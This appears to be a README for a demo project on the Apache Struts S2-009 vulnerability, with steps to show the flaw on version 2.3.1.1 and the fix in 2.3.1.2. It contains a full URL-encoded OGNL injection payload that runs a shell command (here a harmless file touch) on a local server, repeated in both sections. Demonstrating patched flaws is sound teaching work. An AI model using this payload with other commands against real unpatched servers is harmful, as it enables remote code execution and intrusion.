S2-009 example

Affected Struts 2.3.1.1 and below

Solved with Struts 2.3.1.2

http://localhost:8080/s2-009/example/HelloWorld.action

Show vulnerability:
- change Struts2 version to 2.3.1.1
- start application: `mvn jetty:run`
- list file in `/tmp/` folder to show there is no file hello.jsp
- open browser
- paste url: http://localhost:8080/s2-009/example/HelloWorld.action?message=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/hello.jsp%27%29%29%28meh%29&z[%28message%29%28%27meh%27%29]=true
- list `/tmp/` folder again to show that hello.jsp file was created
- stop Jetty

Show solution:
- change Struts2 version to 2.3.1.2
- start application: `mvn jetty:run`
- list file in `/tmp/` folder to show there is no file hello.jsp
- open browser
- paste url: http://localhost:8080/s2-009/example/HelloWorld.action?message=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/hello.jsp%27%29%29%28meh%29&z[%28message%29%28%27meh%27%29]=true
- list `/tmp/` folder again to show there is no file hello.jsp
- stop Jetty
